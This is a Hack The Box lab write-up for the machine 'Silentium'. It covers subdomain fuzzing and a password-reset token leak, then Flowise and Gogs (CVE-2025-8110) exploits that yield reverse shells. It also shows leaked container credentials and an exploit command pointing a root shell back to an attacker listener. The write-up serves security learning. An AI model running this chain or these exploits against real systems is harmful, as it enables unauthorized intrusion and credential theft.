# HTB Write-Up: Silentium

| Field       | Details                                                  |
|-------------|----------------------------------------------------------|
| Platform    | [Hack The Box](https://app.hackthebox.com/machines/Silentium) |
| Difficulty  | Easy                                                     |
| OS          | Linux                                                    |
| Author      | landau                                                   |
| Date        | April 13, 2026                                           |

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Enumeration](#2-enumeration)
3. [Initial Access](#3-initial-access)
4. [Post-Exploitation — Docker Escape](#4-post-exploitation--docker-escape)
5. [Privilege Escalation](#5-privilege-escalation)
6. [Summary](#6-summary)

---

## 1. Reconnaissance

Port scanning was performed using **RustScan** for speed, followed by targeted analysis. The scan revealed only two open ports on the target `10.129.20.220`:

```
Open 10.129.20.220:22  →  SSH
Open 10.129.20.220:80  →  HTTP
```

```bash
rustscan -a 10.129.20.220 --ulimit 5000
```

With a minimal attack surface exposed, focus was directed to the web application on port 80.

---

## 2. Enumeration

### 2.1 — Web Application & Subdomain Discovery

The root web page at `http://silentium.htb` appeared unremarkable. Virtual host (subdomain) fuzzing was performed using **ffuf** to uncover any hidden applications:

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
     -u http://silentium.htb \
     -H 'Host: FUZZ.silentium.htb' \
     -fs 178
```

**Result:**
```
staging    [Status: 200, Size: 3142]
```

The subdomain `staging.silentium.htb` was discovered, hosting a login page. Default credentials did not grant access.

### 2.2 — Directory Enumeration on Staging

Content discovery was run against the staging subdomain:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt \
     -u http://staging.silentium.htb/FUZZ \
     -fs 3142
```

Notable findings:
- `/assets` — Static assets directory (redirect)
- `/register` — Registration endpoint (form non-functional)
- `/signin` — Login page with a **Forgot Password** feature

### 2.3 — User Enumeration

Returning to the main site, three staff names were identified from the public-facing content:

- **Marcus Thorne**
- **Ben**
- **Elena Rossi**

Based on the domain naming convention, a likely email format was inferred: `ben@silentium.htb`.

---

## 3. Initial Access

### 3.1 — Password Reset Token Leak

The **Forgot Password** endpoint (`/api/v1/account/forgot-password`) was tested using **Burp Suite Pro**. Upon submitting `ben@silentium.htb`, the API response body leaked the full user object — including a plaintext temporary reset token:

```json
{
  "user": {
    "id": "e26c9d6c-678c-4c10-9e36-01813e8fea73",
    "name": "admin",
    "email": "ben@silentium.htb",
    "credential": "$2a$05$6o1ngPjXiRj.EbTK33PhyuzNBn2CLo8.b0lyys3Uht9Bfuos2pWhG",
    "tempToken": "djjpSzjvbY2rOFVLSAmtRo5HgHdMS1MoBf4A85Ii8fRlRUpGnjJCdrVrThr5Mmkw",
    "tokenExpiry": "2026-04-13T14:44:02.965Z",
    "status": "active"
  }
}
```

The `tempToken` was used to reset Ben's password, resulting in a successful login to the staging application.

### 3.2 — Flowise RCE (CVE — Flowise 3.0.5)

The web application was identified as **Flowise v3.0.5**, which is vulnerable to a known remote code execution (RCE) vulnerability. A public proof-of-concept (`poc.py`) was used to exploit this:

```bash
python3 poc.py
```

A reverse shell was obtained. However, the shell landed inside a **Docker container** running as `root`.

---

## 4. Post-Exploitation — Docker Escape

### 4.1 — Credential Discovery via Shell History

Inside the container, `/root/.ash_history` was examined. It contained only two commands — `env` and `exit` — indicating that environment variables had been inspected previously. Running `env` within the container exposed the full application configuration, including credentials:

```bash
FLOWISE_USERNAME=ben
FLOWISE_PASSWORD=F1l3_d0ck3r
SENDER_EMAIL=ben@silentium.htb
SMTP_HOST=mailhog
SMTP_PASSWORD=r04D!!_R4ge
JWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
LLM_PROVIDER=nvidia-nim
```

The credential `ben : F1l3_d0ck3r` was tested for SSH access on the host machine.

### 4.2 — SSH Access as `ben`

```bash
ssh ben@silentium.htb
```

Access was successful. **User flag obtained.**

---

## 5. Privilege Escalation

### 5.1 — Internal Service Discovery

`sudo -l` yielded no results. Internal port enumeration revealed a service listening locally:

```bash
ss -tlnp
```

Port **3001** was identified as an internal service not exposed externally.

### 5.2 — SSH Local Port Forwarding

The service was tunnelled to the attacker's machine:

```bash
ssh -L 3001:localhost:3001 ben@silentium.htb
```

Browsing `http://localhost:3001` revealed a **Gogs** Git service instance.

### 5.3 — Gogs RCE (CVE-2025-8110)

A public exploit for **CVE-2025-8110** targeting Gogs was identified and used. A new account was manually registered on the Gogs instance, and the exploit was executed with the created credentials:

```bash
python3 CVE-2025-8110.py -u http://localhost:3001 -lh 10.10.15.52 -lp 1338
```

```
[+] Authenticated successfully
[+] Application token: 7046c431b6d94eca843ec15970a9cfb8723b43a7
[+] Repo creation: 201
[master 24bca2b] Add malicious symlink
[+] Exploit sent, check your listener!
```

A reverse shell with **root** privileges on the host was received on the netcat listener.

**Root flag obtained.**

---

## 6. Summary

| Phase                  | Technique                                        | Result                        |
|------------------------|--------------------------------------------------|-------------------------------|
| Subdomain Enumeration  | Virtual host fuzzing (ffuf)                      | Discovered `staging` subdomain|
| Authentication Bypass  | Password reset token leak via API response       | Login as `ben`                |
| RCE                    | Flowise 3.0.5 exploit (poc.py)                   | Shell in Docker container     |
| Credential Discovery   | `.ash_history` → `env` command → env vars        | SSH credentials for `ben`     |
| Lateral Movement       | SSH with discovered credentials                  | User flag                     |
| Privilege Escalation   | Gogs CVE-2025-8110 via SSH port forwarding       | Root shell on host            |

### Key Takeaways

- **API responses should never leak sensitive user data** — even for authenticated flows like password reset. The temporary token and credential hash being returned in the response body was the critical pivot point for initial access.
- **Container environments inherit secrets** — environment variables are a common and overlooked source of credentials inside Docker containers.
- **Internal services require the same hardening as external ones** — the Gogs instance on port 3001 was only accessible internally, yet it was the path to root.
